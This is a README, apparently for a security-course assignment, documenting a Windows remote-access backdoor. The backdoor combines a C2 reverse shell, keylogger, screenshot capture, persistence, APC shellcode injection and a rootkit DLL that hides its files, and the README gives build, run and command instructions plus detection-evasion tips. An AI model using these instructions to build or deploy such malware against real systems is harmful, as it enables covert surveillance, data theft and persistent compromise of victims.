# Secret Passage 🔒

> 資安課程作業 — Windows 後門程式研究專案

## ⚠️ 免責宣告

本專案僅供**學術研究與教育用途**。所有技術均在受控環境（虛擬機）中測試。請勿用於未經授權的系統。

---

## 📋 功能總覽

| 功能 | 說明 | MITRE ATT&CK |
|------|------|--------------|
| 反向 Shell | 跨平台遠端指令執行 | T1059 |
| XOR 加密通訊 | C2 流量加密，防 Wireshark 明文擷取 | T1071.001 |
| 持久化 | Windows Registry / Linux .bashrc | T1546.003 |
| 鍵盤記錄器 | 背景記錄按鍵，每 5 秒寫入檔案 | T1056.001 |
| 螢幕截圖 | 擷取受害端螢幕，base64 傳輸 | T1113 |
| Early Bird APC Injection | 建立 Suspended Process，寫入 shellcode 後 APC 執行 | T1055.004 |
| 檔案隱藏 | DLL Injection → explorer.exe → Hook ZwQueryDirectoryFile | T1564.001 |
| 邏輯炸彈 + 沙箱檢測 | 隨機延遲 + VM 驅動檢測 | T1497.001 |

---

## 🏗️ 架構

```
┌─────────────────────────────────────────────────────────────┐
│                      C2 Server (server.py)                   │
│  ┌─────────────┐  ┌──────────────┐  ┌────────────────────┐  │
│  │ XOR 解密層   │  │ 指令分派器    │  │ 截圖存檔 / 檔案傳輸 │  │
│  └─────────────┘  └──────────────┘  └────────────────────┘  │
└──────────────────────────┬──────────────────────────────────┘
                           │ TCP + XOR 加密
                           │
┌──────────────────────────┴──────────────────────────────────┐
│                      C2 Client (client.py)                   │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌───────────────┐  │
│  │ 持久化    │ │ Keylogger│ │ Screenshot│ │ APC Injection │  │
│  └──────────┘ └──────────┘ └──────────┘ └───────────────┘  │
│  ┌────────────────────────────────────────────────────────┐ │
│  │              DLL Injector (hidden.dll)                  │ │
│  │  CreateRemoteThread + LoadLibraryW → explorer.exe       │ │
│  │  Hook ZwQueryDirectoryFile → 隱藏 client.exe / srv.exe  │ │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

---

## 🚀 快速開始

### 環境需求

- Python 3.10+
- Windows 10/11（完整功能）/ Linux（部分功能）
- MSVC（編譯 hidden.dll 用）

### 安裝

```bash
git clone https://github.com/Chihhhs/Secret_passage.git
cd Secret_passage
pip install -r requirements.txt
```

### 啟動

```bash
# Terminal 1：啟動 C2 Server
python src/module/server.py

# Terminal 2：啟動 Client
python src/module/client.py
```

### 自訂設定（環境變數）

```bash
# 自訂 Server IP / Port / 加密金鑰
export SP_SERVER_IP="192.168.1.100"
export SP_SERVER_PORT="4444"
export SP_XOR_KEY="MySecretKey2024"

python src/module/client.py
```

---

## 📖 指令說明

| 指令 | 說明 | 範例 |
|------|------|------|
| `<shell 指令>` | 在受害端執行任意 shell 指令 | `dir`, `whoami`, `ipconfig` |
| `cd <path>` | 切換目錄 | `cd C:\Users` |
| `download <file>` | 從受害端下載檔案 | `download secret.txt` |
| `upload <file>` | 上傳檔案到受害端 | `upload malware.exe` |
| `get <url>` | 從 URL 下載檔案到受害端 | `get https://example.com/tool.exe` |
| `start <prog>` | 在受害端啟動程式 | `start notepad.exe` |
| `kl_start` | 啟動鍵盤記錄器 | `kl_start` |
| `screenshot` | 擷取螢幕截圖 | `screenshot` |
| `inject <b64>` | Early Bird APC Injection | `inject <base64_shellcode>` |
| `hide_files` | 隱藏 client.exe / srv.exe / hidden.dll | `hide_files` |
| `eject_hidden` | 清除隱藏設定 | `eject_hidden` |
| `help` | 顯示說明 | `help` |
| `q` | 斷線 | `q` |

---

## 🔐 XOR 加密通訊

client 和 server 之間的通訊使用 XOR 加密，避免被 Wireshark 等工具明文擷取。

### 原理

```
明文 → JSON 序列化 → XOR 加密 → 加上 4 bytes 長度表頭 → TCP 傳輸
```

XOR 是對稱加密：加密兩次 = 原文。

### 驗證加密

```python
from src.module.client import xor_crypt

data = b"test command"
encrypted = xor_crypt(data)
decrypted = xor_crypt(encrypted)

assert decrypted == data  # ✓
print("XOR 加密驗證通過")
```

### Wireshark 驗證

1. 啟動 Wireshark，過濾 `tcp.port == 12345`
2. 執行任意指令
3. 確認 TCP payload 不是明文 JSON

---

## 💉 Early Bird APC Injection

### 原理

```
1. CreateProcess(SUSPENDED) → 建立 notepad.exe（暫停狀態）
2. VirtualAllocEx → 在目標 process 分配記憶體（RW）
3. WriteProcessMemory → 寫入 shellcode
4. VirtualProtectEx → 修改為 RX（可執行）
5. QueueUserAPC → 設定 APC 回調
6. ResumeThread → 恢復執行 → shellcode 被執行
```

### 規避技術

- **W^X 原則**：先 RW 寫入，再改為 RX 執行
- **延遲**：CreateProcess 和 QueueUserAPC 之間加入 1 秒延遲
- **合法目標**：注入 notepad.exe 而非 svchost.exe

### 測試

```bash
# 產生 calc.exe shellcode
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=none -f raw | base64

# Server 端執行
inject <base64_shellcode>
```

---

## 📁 檔案隱藏（DLL Injection + API Hook）

### 原理

```
client.py ──CreateRemoteThread──→ explorer.exe
                                      │
                              LoadLibraryW(hidden.dll)
                                      │
                              DllMain 執行
                                      │
                              MinHook: Hook ZwQueryDirectoryFile
                                      │
                              過濾 FILE_DIRECTORY_INFORMATION 鏈結串列
                                      │
                              client.exe / srv.exe 從 Explorer 消失
```

### 隱藏目標

| 檔案 | 說明 |
|------|------|
| `client.exe` | 後門主程式 |
| `srv.exe` | 持久化副本 |
| `hidden.dll` | Rootkit DLL |

### 測試步驟

1. 編譯 hidden.dll：
   ```bash
   cl /LD src/ptr/src/hidden.cpp /Fe:hidden.dll /I src/ptr/include /link MinHook.x64.lib
   ```
2. 將 hidden.dll 放在與 client.exe 相同目錄
3. 啟動 server 和 client
4. 執行 `hide_files`
5. 在檔案總管中確認 client.exe 消失
6. 用 `dir` 確認檔案仍然存在

### 解除隱藏

```bash
eject_hidden
# 然後重啟 Explorer
taskkill /f /im explorer.exe && start explorer.exe
```

---

## 📸 螢幕截圖

### 平台支援

| 平台 | 方法 | 格式 |
|------|------|------|
| Windows | gdi32.dll BitBlt | BMP |
| Linux | scrot / gnome-screenshot | PNG |

### 流程

```
server: screenshot
  → client: take_screenshot()
  → 擷取螢幕 → base64 編碼 → [IMG]...[/IMG]
  → server: 解析 → 存為 screenshot_YYYYMMDD_HHMMSS.bmp
```

---

## ⌨️ 鍵盤記錄器

### 流程

```
server: kl_start
  → client: 啟動 pynput.keyboard.Listener（背景執行）
  → 每 5 秒寫入 %appdata%\srv.txt
```

### 快捷鍵

- 按方向鍵（↑↓←→）→ `sys.exit(0)`，client 退出

---

## 🧪 單元測試

```bash
# 執行所有測試
python -m unittest discover -s test -v

# 預期結果：所有測試通過
```

### 測試覆蓋範圍

- XOR 加密/解密
- 邏輯炸彈 + 沙箱檢測
- 可靠通訊層（TCP 分段重組）
- 持久化（Windows / Linux）
- DLL Injector（registry、explorer.exe 查找）
- Server 端加密通訊

---

## 🔧 CI/CD

### GitHub Actions

| Workflow | 觸發條件 | 產出 |
|----------|----------|------|
| `build.yml` | push / workflow_dispatch | client.exe + hidden.dll |
| `release.yml` | tag push (v*.*.*) | GitHub Release |

### 自動編譯

1. PyInstaller 打包 client.py → client.exe
2. 下載並編譯 MinHook
3. MSVC 編譯 hidden.cpp → hidden.dll
4. 上傳為 Artifact / Release

---

## 📁 專案結構

```
Secret_passage/
├── src/
│   ├── module/
│   │   ├── client.py      # C2 Client（主程式）
│   │   └── server.py      # C2 Server
│   └── ptr/
│       ├── src/
│       │   └── hidden.cpp  # Rootkit DLL（API Hook）
│       └── include/
│           └── MinHook.h   # MinHook 標頭檔
├── test/
│   ├── test_backdoor.py    # 單元測試
│   └── testing.md          # 手動測試步驟
├── .github/workflows/
│   ├── build.yml           # CI：編譯 EXE + DLL
│   └── release.yml         # CD：發布 Release
├── requirements.txt        # Python 依賴
└── README.md
```

---

## 📚 參考資料

- [iT 邦幫忙：Ring3 Rootkit 隱藏檔案](https://ithelp.ithome.com.tw/articles/10274332)
- [MinHook](https://github.com/TsudaKageyu/minhook) — Minimalistic API Hooking Library
- [MITRE ATT&CK](https://attack.mitre.org/) — 攻擊技術框架
